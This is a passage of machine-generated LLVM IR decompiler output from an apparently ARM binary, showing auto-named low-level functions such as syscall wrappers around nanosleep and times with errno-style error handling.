  %v9_14a9c = icmp eq i32 %v0_14a9c, %v1_14a9c
  br i1 %v9_14a9c, label %dec_label_pc_14aa4, label %dec_label_pc_14b38

dec_label_pc_14aa4:                               ; preds = %dec_label_pc_14a88
  %v0_14aa4 = call i32 @function_13470()
  store i32 22, i32* %r3.global-to-local, align 4
  store i32 -1, i32* %r1.global-to-local, align 4
  %v2_14ab0 = inttoptr i32 %v0_14aa4 to i32*
  store i32 22, i32* %v2_14ab0, align 4
  %v0_14b3c.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_14b3c

dec_label_pc_14ab8:                               ; preds = %dec_label_pc_14a64
  %v3_14a8011 = udiv i32 %v1_14a70, 256
  %v1_14ab8 = trunc i32 %v3_14a8011 to i8
  %v3_14ab8 = add i32 %v2_14ab8, 17
  %v4_14ab8 = inttoptr i32 %v3_14ab8 to i8*
  store i8 %v1_14ab8, i8* %v4_14ab8, align 1
  %v0_14abc = load i32, i32* %r3.global-to-local, align 4
  %v1_14abc = trunc i32 %v0_14abc to i8
  %v2_14abc = load i32, i32* @r5, align 4
  %v3_14abc = add i32 %v2_14abc, 16
  %v4_14abc = inttoptr i32 %v3_14abc to i8*
  store i8 %v1_14abc, i8* %v4_14abc, align 1
  %v0_14ac0 = load i32, i32* @r4, align 4
  %v1_14ac0 = add i32 %v0_14ac0, 8
  %v1_14ac4 = inttoptr i32 %v1_14ac0 to i32*
  %v2_14ac4 = load i32, i32* %v1_14ac4, align 4
  %v3_14ac4 = add i32 %v0_14ac0, 12
  %v4_14ac4 = inttoptr i32 %v3_14ac4 to i32*
  %v5_14ac4 = load i32, i32* %v4_14ac4, align 4
  store i32 %v5_14ac4, i32* %r3.global-to-local, align 4
  %v1_14ad0 = inttoptr i32 %v0_14ac0 to i32*
  %v2_14ad0 = load i32, i32* %v1_14ad0, align 4
  %v3_14ad0 = add i32 %v0_14ac0, 4
  %v4_14ad0 = inttoptr i32 %v3_14ad0 to i32*
  %v5_14ad0 = load i32, i32* %v4_14ad0, align 4
  store i32 %v5_14ad0, i32* %r3.global-to-local, align 4
  %v0_14ad4 = load i32, i32* @r5, align 4
  %v1_14ad4 = inttoptr i32 %v0_14ad4 to i32*
  store i32 %v2_14ad0, i32* %v1_14ad4, align 4
  %v3_14ad4 = add i32 %v0_14ad4, 4
  %v4_14ad4 = inttoptr i32 %v3_14ad4 to i32*
  %v5_14ad4 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v5_14ad4, i32* %v4_14ad4, align 4
  %v0_14ad8 = load i32, i32* @r4, align 4
  %v1_14ad8 = add i32 %v0_14ad8, 8
  %v1_14adc = inttoptr i32 %v1_14ad8 to i32*
  %v2_14adc = load i32, i32* %v1_14adc, align 4
  %v3_14adc = add i32 %v0_14ad8, 12
  %v4_14adc = inttoptr i32 %v3_14adc to i32*
  %v5_14adc = load i32, i32* %v4_14adc, align 4
  store i32 %v5_14adc, i32* %r3.global-to-local, align 4
  %v1_14ae0 = load i32, i32* @r5, align 4
  %v2_14ae0 = add i32 %v1_14ae0, 8
  %v3_14ae0 = inttoptr i32 %v2_14ae0 to i32*
  store i32 %v2_14adc, i32* %v3_14ae0, align 4
  %v0_14ae4 = load i32, i32* %r3.global-to-local, align 4
  %v1_14ae4 = load i32, i32* @r5, align 4
  %v2_14ae4 = add i32 %v1_14ae4, 12
  %v3_14ae4 = inttoptr i32 %v2_14ae4 to i32*
  store i32 %v0_14ae4, i32* %v3_14ae4, align 4
  %v0_14ae8 = load i32, i32* @r4, align 4
  %v1_14ae8 = add i32 %v0_14ae8, 18
  %v2_14ae8 = inttoptr i32 %v1_14ae8 to i8*
  %v3_14ae8 = load i8, i8* %v2_14ae8, align 1
  %v4_14ae8 = zext i8 %v3_14ae8 to i32
  store i32 %v4_14ae8, i32* %r3.global-to-local, align 4
  %v2_14aec = load i32, i32* @r5, align 4
  %v3_14aec = add i32 %v2_14aec, 18
  %v4_14aec = inttoptr i32 %v3_14aec to i8*
  store i8 %v3_14ae8, i8* %v4_14aec, align 1
  %v0_14af0 = load i32, i32* @r4, align 4
  %v1_14af0 = add i32 %v0_14af0, 16
  %v2_14af0 = inttoptr i32 %v1_14af0 to i8*
  %v3_14af0 = load i8, i8* %v2_14af0, align 1
  %v4_14af0 = zext i8 %v3_14af0 to i32
  %v0_14af4 = load i32, i32* %r7.global-to-local, align 4
  %v1_14af4 = add i32 %v0_14af4, 1
  %v2_14af4 = inttoptr i32 %v1_14af4 to i8*
  %v3_14af4 = load i8, i8* %v2_14af4, align 1
  %v4_14af4 = zext i8 %v3_14af4 to i32
  store i32 %v4_14af4, i32* %r3.global-to-local, align 4
  %v4_14af8 = mul nuw nsw i32 %v4_14af4, 256
  %v5_14af8 = or i32 %v4_14af8, %v4_14af0
  %v1_14afc = add nsw i32 %v5_14af8, -19
  store i32 %v1_14afc, i32* @r2, align 4
  %v3_14b00 = call i32 @function_134b0(i32 %v1_14b28, i32 %v1_14b2c, i32 %v1_14afc)
  %v0_14b04 = load i32, i32* @r4, align 4
  %v1_14b04 = add i32 %v0_14b04, 16
  %v2_14b04 = inttoptr i32 %v1_14b04 to i8*
  %v3_14b04 = load i8, i8* %v2_14b04, align 1
  %v4_14b04 = zext i8 %v3_14b04 to i32
  store i32 %v4_14b04, i32* %r3.global-to-local, align 4
  %v0_14b08 = load i32, i32* %r7.global-to-local, align 4
  %v1_14b08 = add i32 %v0_14b08, 1
  %v2_14b08 = inttoptr i32 %v1_14b08 to i8*
  %v3_14b08 = load i8, i8* %v2_14b08, align 1
  %v4_14b08 = zext i8 %v3_14b08 to i32
  %v4_14b0c = mul nuw nsw i32 %v4_14b08, 256
  %v5_14b0c = or i32 %v4_14b0c, %v4_14b04
  store i32 %v5_14b0c, i32* %r3.global-to-local, align 4
  %v2_14b10 = add i32 %v5_14b0c, %v0_14b04
  store i32 %v2_14b10, i32* @r4, align 4
  %v0_14b14 = load i32, i32* %sb.global-to-local, align 4
  store i32 %v0_14b14, i32* @r5, align 4
  %v1_14b18.pre = load i32, i32* @r6, align 4
  %v0_14b30.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_14b18

dec_label_pc_14b18:                               ; preds = %dec_label_pc_14a48, %dec_label_pc_14ab8
  %stack_var_-52.0 = phi i32 [ -1, %dec_label_pc_14a48 ], [ %v2_14ac4, %dec_label_pc_14ab8 ]
  %v0_14b30 = phi i32 [ %v0_14a50, %dec_label_pc_14a48 ], [ %v0_14b30.pre, %dec_label_pc_14ab8 ]
  %v2_14ab8 = phi i32 [ %v0_14a50, %dec_label_pc_14a48 ], [ %v0_14b14, %dec_label_pc_14ab8 ]
  %v0_14a68 = phi i32 [ %v0_14a54, %dec_label_pc_14a48 ], [ %v2_14b10, %dec_label_pc_14ab8 ]
  %v1_14b18 = phi i32 [ %v5_14a14, %dec_label_pc_14a48 ], [ %v1_14b18.pre, %dec_label_pc_14ab8 ]
  %stack_var_-48.0 = phi i32 [ -1, %dec_label_pc_14a48 ], [ %v5_14ac4, %dec_label_pc_14ab8 ]
  %v0_14b18 = load i32, i32* %sl.global-to-local, align 4
  %v2_14b18 = add i32 %v0_14b18, %v1_14b18
  store i32 %v2_14b18, i32* %r3.global-to-local, align 4
  %v3_14b1c = load i32, i32* %stack_var_-60, align 4
  store i32 %v3_14b1c, i32* @r2, align 4
  %v3_14b20 = icmp ult i32 %v0_14a68, %v2_14b18
  %v1_14b24 = add i32 %v0_14a68, 16
  store i32 %v1_14b24, i32* %r7.global-to-local, align 4
  %v1_14b28 = add i32 %v2_14ab8, 19
  store i32 %v1_14b28, i32* @r0, align 4
  %v1_14b2c = add i32 %v0_14a68, 19
  store i32 %v1_14b2c, i32* @r1, align 4
  br i1 %v3_14b20, label %dec_label_pc_14a64, label %dec_label_pc_14b38

dec_label_pc_14b38:                               ; preds = %dec_label_pc_14b18, %dec_label_pc_14a88
  %v1_14b38 = phi i32 [ %v0_14a9c, %dec_label_pc_14a88 ], [ %v2_14ab8, %dec_label_pc_14b18 ]
  %v0_14b38 = phi i32 [ %v1_14a9c, %dec_label_pc_14a88 ], [ %v0_14b30, %dec_label_pc_14b18 ]
  %v2_14b38 = sub i32 %v1_14b38, %v0_14b38
  store i32 %v2_14b38, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_14b3c

dec_label_pc_14b3c:                               ; preds = %dec_label_pc_14aa4, %dec_label_pc_14a40, %dec_label_pc_14b38
  %v0_14b3c = phi i32 [ %v0_14b3c.pre, %dec_label_pc_14aa4 ], [ %v0_14a40, %dec_label_pc_14a40 ], [ %v2_14b38, %dec_label_pc_14b38 ]
  store i32 %v3_149e8, i32* @r4, align 4
  store i32 %v9_149e8, i32* %r6.global-to-local, align 4
  ret i32 %v0_14b3c

; uselistorder directives
  uselistorder i32 %v1_14b2c, { 1, 0 }
  uselistorder i32 %v1_14b28, { 1, 0 }
  uselistorder i32 %v1_14b24, { 1, 0 }
  uselistorder i32 %v3_14b1c, { 1, 0 }
  uselistorder i32 %v0_14a68, { 2, 1, 3, 0 }
  uselistorder i32 %v2_14ab8, { 0, 3, 1, 2 }
  uselistorder i32 %v0_14ac0, { 1, 0, 2, 3 }
  uselistorder i32 %v0_14a50, { 1, 0, 2 }
  uselistorder i32 %v5_14a14, { 1, 0, 2 }
  uselistorder i32* %r7.global-to-local, { 2, 0, 1 }
  uselistorder i32* %r3.global-to-local, { 13, 0, 1, 2, 3, 4, 5, 6, 7, 8, 11, 9, 10, 12, 14, 15, 16 }
  uselistorder i32 (i32, i32, i32)* @function_134b0, { 5, 2, 1, 3, 8, 7, 4, 6, 0 }
  uselistorder i32 128, { 11, 12, 27, 13, 28, 18, 16, 23, 2, 24, 19, 3, 20, 4, 14, 15, 21, 22, 6, 0, 1, 7, 8, 9, 25, 5, 26, 17, 10 }
  uselistorder i32* @sp, { 4, 5, 1, 6, 0, 7, 2, 8, 3 }
  uselistorder i32* @r6, { 1, 101, 102, 103, 335, 336, 301, 302, 303, 304, 305, 306, 307, 308, 322, 337, 338, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 309, 310, 311, 312, 313, 314, 320, 321, 315, 316, 317, 318, 319, 263, 264, 265, 0, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 2, 90, 91, 92, 93, 94, 12, 95, 96, 97, 98, 99, 100, 122, 123, 124, 125, 11, 126, 127, 128, 3, 129, 130, 131, 4, 132, 5, 133, 6, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168, 169, 170, 171, 172, 173, 174, 175, 176, 177, 178, 179, 180, 181, 182, 183, 184, 185, 186, 187, 188, 189, 190, 191, 192, 193, 194, 195, 196, 197, 198, 199, 200, 201, 202, 203, 204, 205, 206, 207, 208, 209, 210, 211, 212, 213, 214, 215, 216, 217, 218, 219, 220, 221, 222, 223, 224, 225, 226, 227, 228, 229, 230, 231, 232, 233, 234, 235, 236, 237, 238, 239, 240, 241, 242, 243, 244, 245, 246, 247, 248, 249, 250, 251, 252, 253, 254, 255, 256, 257, 258, 259, 260, 261, 262, 266, 267, 268, 269, 270, 271, 272, 273, 274, 275, 276, 277, 278, 279, 280, 281, 282, 283, 284, 285, 286, 287, 288, 289, 290, 291, 292, 293, 294, 295, 296, 297, 298, 299, 300, 323, 326, 324, 325, 327, 328, 13, 329, 330, 331, 332, 333, 334, 339, 340, 341, 342, 343, 344, 345, 346, 347, 348, 7, 349, 350, 351, 352, 353, 354, 356, 8, 355, 357, 358, 359, 360, 361, 362, 363, 364, 365, 366, 367, 368, 369, 370, 371, 372, 373, 374, 375, 376, 377, 378, 379, 380, 381, 382, 383, 384, 9, 10, 385, 386, 387, 388, 389, 390, 391, 392, 393, 394, 395, 396, 397, 398, 399, 400, 401, 402, 403 }
  uselistorder label %dec_label_pc_14b3c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_14b18, { 1, 0 }
}

define i32 @function_14b48() local_unnamed_addr {
dec_label_pc_14b48:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_14b48 = load i32, i32* @r4, align 4
  store i32 %v3_14b48, i32* %stack_var_-8, align 4
  %v0_14b50 = load i32, i32* @r0, align 4
  store i32 %v0_14b50, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_14b50, -4095
  br i1 %tmp, label %dec_label_pc_14b6c, label %dec_label_pc_14b5c

dec_label_pc_14b5c:                               ; preds = %dec_label_pc_14b48
  %v0_14b5c = call i32 @function_13470()
  %v0_14b60 = load i32, i32* %r4.global-to-local, align 4
  %v1_14b60 = sub i32 0, %v0_14b60
  %v2_14b64 = inttoptr i32 %v0_14b5c to i32*
  store i32 %v1_14b60, i32* %v2_14b64, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  %v2_14b70.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_14b6c

dec_label_pc_14b6c:                               ; preds = %dec_label_pc_14b48, %dec_label_pc_14b5c
  %v2_14b70 = phi i32 [ %v3_14b48, %dec_label_pc_14b48 ], [ %v2_14b70.pre, %dec_label_pc_14b5c ]
  %v0_14b6c = phi i32 [ %v0_14b50, %dec_label_pc_14b48 ], [ -1, %dec_label_pc_14b5c ]
  store i32 %v2_14b70, i32* @r4, align 4
  ret i32 %v0_14b6c

; uselistorder directives
  uselistorder i32 %v0_14b50, { 1, 0, 2 }
  uselistorder label %dec_label_pc_14b6c, { 1, 0 }
}

define i32 @function_14b74() local_unnamed_addr {
dec_label_pc_14b74:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_14b74 = load i32, i32* @r4, align 4
  store i32 %v3_14b74, i32* %stack_var_-8, align 4
  %v0_14b7c = load i32, i32* @r0, align 4
  store i32 %v0_14b7c, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_14b7c, -4095
  br i1 %tmp, label %dec_label_pc_14b98, label %dec_label_pc_14b88

dec_label_pc_14b88:                               ; preds = %dec_label_pc_14b74
  %v0_14b88 = call i32 @function_13470()
  %v0_14b8c = load i32, i32* %r4.global-to-local, align 4
  %v1_14b8c = sub i32 0, %v0_14b8c
  %v2_14b90 = inttoptr i32 %v0_14b88 to i32*
  store i32 %v1_14b8c, i32* %v2_14b90, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  %v2_14b9c.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_14b98

dec_label_pc_14b98:                               ; preds = %dec_label_pc_14b74, %dec_label_pc_14b88
  %v2_14b9c = phi i32 [ %v3_14b74, %dec_label_pc_14b74 ], [ %v2_14b9c.pre, %dec_label_pc_14b88 ]
  %v0_14b98 = phi i32 [ %v0_14b7c, %dec_label_pc_14b74 ], [ -1, %dec_label_pc_14b88 ]
  store i32 %v2_14b9c, i32* @r4, align 4
  ret i32 %v0_14b98

; uselistorder directives
  uselistorder i32 %v0_14b7c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_14b98, { 1, 0 }
}

define i32 @function_14ba0(i32 %arg1) local_unnamed_addr {
dec_label_pc_14ba0:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_14ba0 = load i32, i32* @r4, align 4
  store i32 %v3_14ba0, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_14bc4, label %dec_label_pc_14bb4

dec_label_pc_14bb4:                               ; preds = %dec_label_pc_14ba0
  %v0_14bb4 = call i32 @function_13470()
  %v0_14bb8 = load i32, i32* %r4.global-to-local, align 4
  %v1_14bb8 = sub i32 0, %v0_14bb8
  %v2_14bbc = inttoptr i32 %v0_14bb4 to i32*
  store i32 %v1_14bb8, i32* %v2_14bbc, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  %v2_14bc8.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_14bc4

dec_label_pc_14bc4:                               ; preds = %dec_label_pc_14ba0, %dec_label_pc_14bb4
  %v2_14bc8 = phi i32 [ %v3_14ba0, %dec_label_pc_14ba0 ], [ %v2_14bc8.pre, %dec_label_pc_14bb4 ]
  %v0_14bc4 = phi i32 [ %arg1, %dec_label_pc_14ba0 ], [ -1, %dec_label_pc_14bb4 ]
  store i32 %v2_14bc8, i32* %r4.global-to-local, align 4
  ret i32 %v0_14bc4

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_14bc4, { 1, 0 }
}

define i32 @function_14bcc() local_unnamed_addr {
dec_label_pc_14bcc:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_14bcc = load i32, i32* @r4, align 4
  store i32 %v3_14bcc, i32* %stack_var_-8, align 4
  %v0_14bd4 = load i32, i32* @r0, align 4
  store i32 %v0_14bd4, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_14bd4, -4095
  br i1 %tmp, label %dec_label_pc_14bf0, label %dec_label_pc_14be0

dec_label_pc_14be0:                               ; preds = %dec_label_pc_14bcc
  %v0_14be0 = call i32 @function_13470()
  %v0_14be4 = load i32, i32* %r4.global-to-local, align 4
  %v1_14be4 = sub i32 0, %v0_14be4
  %v2_14be8 = inttoptr i32 %v0_14be0 to i32*
  store i32 %v1_14be4, i32* %v2_14be8, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  %v2_14bf4.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_14bf0

dec_label_pc_14bf0:                               ; preds = %dec_label_pc_14bcc, %dec_label_pc_14be0
  %v2_14bf4 = phi i32 [ %v3_14bcc, %dec_label_pc_14bcc ], [ %v2_14bf4.pre, %dec_label_pc_14be0 ]
  %v0_14bf0 = phi i32 [ %v0_14bd4, %dec_label_pc_14bcc ], [ -1, %dec_label_pc_14be0 ]
  store i32 %v2_14bf4, i32* %r4.global-to-local, align 4
  ret i32 %v0_14bf0

; uselistorder directives
  uselistorder i32 %v0_14bd4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_14bf0, { 1, 0 }
}

define i32 @function_14bf8(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_14bf8:
  %r4.global-to-local = alloca i32, align 4
  %tmp9 = call i32 @__decompiler_undefined_function_0()
  store i32 %arg2, i32* @r2, align 4
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_14c3c, label %dec_label_pc_14c28

dec_label_pc_14c28:                               ; preds = %dec_label_pc_14bf8
  %v0_14c28 = call i32 @function_13470()
  %v0_14c2c = load i32, i32* %r4.global-to-local, align 4
  %v1_14c2c = sub i32 0, %v0_14c2c
  store i32 -1, i32* %r4.global-to-local, align 4
  %v2_14c34 = inttoptr i32 %v0_14c28 to i32*
  store i32 %v1_14c2c, i32* %v2_14c34, align 4
  %v0_14c44.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_14c44

dec_label_pc_14c3c:                               ; preds = %dec_label_pc_14bf8
  %v2_14c3c = icmp eq i32 %arg1, 0
  br i1 %v2_14c3c, label %dec_label_pc_14c50, label %dec_label_pc_14c44

dec_label_pc_14c44:                               ; preds = %dec_label_pc_14c3c, %dec_label_pc_14c28
  %v0_14c44 = phi i32 [ %arg1, %dec_label_pc_14c3c ], [ %v0_14c44.pre, %dec_label_pc_14c28 ]
  br label %dec_label_pc_14c54

dec_label_pc_14c50:                               ; preds = %dec_label_pc_14c3c
  br label %dec_label_pc_14c54

dec_label_pc_14c54:                               ; preds = %dec_label_pc_14c44, %dec_label_pc_14c50
  %v14_14c58 = phi i32 [ %v0_14c44, %dec_label_pc_14c44 ], [ %tmp9, %dec_label_pc_14c50 ]
  ret i32 %v14_14c58

; uselistorder directives
  uselistorder i32 %arg1, { 1, 3, 0, 2 }
  uselistorder label %dec_label_pc_14c54, { 1, 0 }
}

define i32 @function_14c5c(%timespec* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_14c5c:
  %r4.global-to-local = alloca i32, align 4
  %tmp = inttoptr i32 %arg2 to %timespec*
  %stack_var_-8 = alloca i32, align 4
  %v3_14c5c = load i32, i32* @r4, align 4
  store i32 %v3_14c5c, i32* %stack_var_-8, align 4
  %v6_14c60 = call i32 @nanosleep(%timespec* %arg1, %timespec* %tmp)
  store i32 %v6_14c60, i32* %r4.global-to-local, align 4
  %tmp6 = icmp ult i32 %v6_14c60, -4095
  br i1 %tmp6, label %dec_label_pc_14c80, label %dec_label_pc_14c70

dec_label_pc_14c70:                               ; preds = %dec_label_pc_14c5c
  %v0_14c70 = call i32 @function_13470()
  %v0_14c74 = load i32, i32* %r4.global-to-local, align 4
  %v1_14c74 = sub i32 0, %v0_14c74
  %v2_14c78 = inttoptr i32 %v0_14c70 to i32*
  store i32 %v1_14c74, i32* %v2_14c78, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_14c80

dec_label_pc_14c80:                               ; preds = %dec_label_pc_14c5c, %dec_label_pc_14c70
  %v0_14c80 = phi i32 [ %v6_14c60, %dec_label_pc_14c5c ], [ -1, %dec_label_pc_14c70 ]
  %v2_14c84 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_14c84, i32* %r4.global-to-local, align 4
  ret i32 %v0_14c80

; uselistorder directives
  uselistorder i32 %v6_14c60, { 1, 0, 2 }
  uselistorder label %dec_label_pc_14c80, { 1, 0 }
}

define i32 @function_14c88(i32 %arg1) local_unnamed_addr {
dec_label_pc_14c88:
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_14c88 = load i32, i32* @r4, align 4
  store i32 %v3_14c88, i32* %stack_var_-12, align 4
  store i32 ptrtoint (i32* @global_var_1e468.673 to i32), i32* %r4.global-to-local, align 4
  %v2_14c90 = load i32, i32* @global_var_1e468.673, align 4
  %v2_14c94 = icmp eq i32 %v2_14c90, 0
  store i32 %arg1, i32* %r5.global-to-local, align 4
  br i1 %v2_14c94, label %dec_label_pc_14ca4, label %dec_label_pc_14cb0

dec_label_pc_14ca4:                               ; preds = %dec_label_pc_14c88
  %v2_14ca4 = call i32 @function_15690(i32* null)
  %v1_14ca8 = icmp slt i32 %v2_14ca4, 0
  br i1 %v1_14ca8, label %dec_label_pc_14cd0, label %dec_label_pc_14cb0thread-pre-split

dec_label_pc_14cb0thread-pre-split:               ; preds = %dec_label_pc_14ca4
  %v0_14cb4.pr = load i32, i32* %r5.global-to-local, align 4
  %v2_14cb0.pre = load i32, i32* @global_var_1e468.673, align 4
  br label %dec_label_pc_14cb0

dec_label_pc_14cb0:                               ; preds = %dec_label_pc_14cb0thread-pre-split, %dec_label_pc_14c88
  %v2_14cb0 = phi i32 [ %v2_14cb0.pre, %dec_label_pc_14cb0thread-pre-split ], [ %v2_14c90, %dec_label_pc_14c88 ]
  %v1_14cbc = phi i32 [ %v0_14cb4.pr, %dec_label_pc_14cb0thread-pre-split ], [ %arg1, %dec_label_pc_14c88 ]
  %v2_14cb4 = icmp eq i32 %v1_14cbc, 0
  store i32 %v2_14cb0, i32* %r4.global-to-local, align 4
  br i1 %v2_14cb4, label %dec_label_pc_14cd4, label %dec_label_pc_14cc4

dec_label_pc_14cc4:                               ; preds = %dec_label_pc_14cb0
  %v2_14cbc = add i32 %v1_14cbc, %v2_14cb0
  %v1_14cc4 = inttoptr i32 %v2_14cbc to i32*
  %v2_14cc4 = call i32 @function_15690(i32* %v1_14cc4)
  %v1_14cc8 = icmp slt i32 %v2_14cc4, 0
  br i1 %v1_14cc8, label %dec_label_pc_14cd0, label %dec_label_pc_14cc4.dec_label_pc_14cd4_crit_edge

dec_label_pc_14cc4.dec_label_pc_14cd4_crit_edge:  ; preds = %dec_label_pc_14cc4
  %v0_14cd4.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_14cd4

dec_label_pc_14cd0:                               ; preds = %dec_label_pc_14cc4, %dec_label_pc_14ca4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_14cd4

dec_label_pc_14cd4:                               ; preds = %dec_label_pc_14cc4.dec_label_pc_14cd4_crit_edge, %dec_label_pc_14cb0, %dec_label_pc_14cd0
  %v0_14cd4 = phi i32 [ %v0_14cd4.pre, %dec_label_pc_14cc4.dec_label_pc_14cd4_crit_edge ], [ %v2_14cb0, %dec_label_pc_14cb0 ], [ -1, %dec_label_pc_14cd0 ]
  %v2_14cd8 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_14cd8, i32* @r4, align 4
  ret i32 %v0_14cd4

; uselistorder directives
  uselistorder i32 %v2_14cb0, { 1, 0, 2 }
  uselistorder i32* null, { 0, 3, 7, 38, 39, 4, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 1, 18, 19, 20, 2, 21, 25, 24, 23, 22, 37, 6, 26, 27, 28, 35, 29, 30, 31, 32, 33, 34, 5, 36 }
  uselistorder label %dec_label_pc_14cd4, { 2, 0, 1 }
}

define i32 @function_14ce0(%tms* %arg1) local_unnamed_addr {
dec_label_pc_14ce0:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_14ce0 = load i32, i32* @r4, align 4
  store i32 %v3_14ce0, i32* %stack_var_-8, align 4
  %v3_14ce4 = call i32 @times(%tms* %arg1)
  store i32 %v3_14ce4, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v3_14ce4, -4095
  br i1 %tmp, label %dec_label_pc_14d04, label %dec_label_pc_14cf4

dec_label_pc_14cf4:                               ; preds = %dec_label_pc_14ce0
  %v0_14cf4 = call i32 @function_13470()
  %v0_14cf8 = load i32, i32* %r4.global-to-local, align 4
  %v1_14cf8 = sub i32 0, %v0_14cf8
  %v2_14cfc = inttoptr i32 %v0_14cf4 to i32*
  store i32 %v1_14cf8, i32* %v2_14cfc, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_14d04

dec_label_pc_14d04:                               ; preds = %dec_label_pc_14ce0, %dec_label_pc_14cf4
  %v0_14d04 = phi i32 [ %v3_14ce4, %dec_label_pc_14ce0 ], [ -1, %dec_label_pc_14cf4 ]
  %v2_14d08 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_14d08, i32* %r4.global-to-local, align 4
  ret i32 %v0_14d04

; uselistorder directives
  uselistorder i32 %v3_14ce4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_14d04, { 1, 0 }
}

define i32 @function_14d0c(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_14d0c:
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %arg2, i32* %r7.global-to-local, align 4
  store i32 %tmp, i32* %r4.global-to-local, align 4
  store i32 96, i32* @r2, align 4
  %v2_14d28 = inttoptr i32 %arg2 to i8*
  %v3_14d28 = call i32 @function_134d0(i8* %v2_14d28, i32 0)
  %v1_14d2c = add i32 %tmp, 1
  %v2_14d2c = inttoptr i32 %v1_14d2c to i8*
  %v3_14d2c = load i8, i8* %v2_14d2c, align 1
  %v4_14d2c = zext i8 %v3_14d2c to i32
  %v1_14d30 = add i32 %tmp, 5
  %v2_14d30 = inttoptr i32 %v1_14d30 to i8*
  %v3_14d30 = load i8, i8* %v2_14d30, align 1
  %v4_14d30 = zext i8 %v3_14d30 to i32
  %v2_14d34 = load i8, i8* %arg1, align 1
  %v3_14d34 = zext i8 %v2_14d34 to i32
  %v1_14d38 = add i32 %tmp, 4
  %v2_14d38 = inttoptr i32 %v1_14d38 to i8*
  %v3_14d38 = load i8, i8* %v2_14d38, align 1
  %v4_14d38 = zext i8 %v3_14d38 to i32
  %v1_14d3c = add i32 %tmp, 2
  %v2_14d3c = inttoptr i32 %v1_14d3c to i8*
  %v3_14d3c = load i8, i8* %v2_14d3c, align 1
  %v4_14d3c = zext i8 %v3_14d3c to i32
  %v1_14d40 = add i32 %tmp, 6
  %v2_14d40 = inttoptr i32 %v1_14d40 to i8*
  %v3_14d40 = load i8, i8* %v2_14d40, align 1
  %v4_14d40 = zext i8 %v3_14d40 to i32
  %v1_14d44 = add i32 %tmp, 3
  %v2_14d44 = inttoptr i32 %v1_14d44 to i8*
  %v3_14d44 = load i8, i8* %v2_14d44, align 1
  %v4_14d44 = zext i8 %v3_14d44 to i32
  %v4_14d48 = mul nuw nsw i32 %v4_14d2c, 256
  %v5_14d48 = or i32 %v3_14d34, %v4_14d48
  %v4_14d4c = mul nuw nsw i32 %v4_14d30, 256
  %v5_14d4c = or i32 %v4_14d38, %v4_14d4c
  %v1_14d50 = add i32 %tmp, 7
  %v2_14d50 = inttoptr i32 %v1_14d50 to i8*
  %v3_14d50 = load i8, i8* %v2_14d50, align 1
  %v4_14d50 = zext i8 %v3_14d50 to i32
  %v4_14d54 = mul nuw nsw i32 %v4_14d3c, 65536
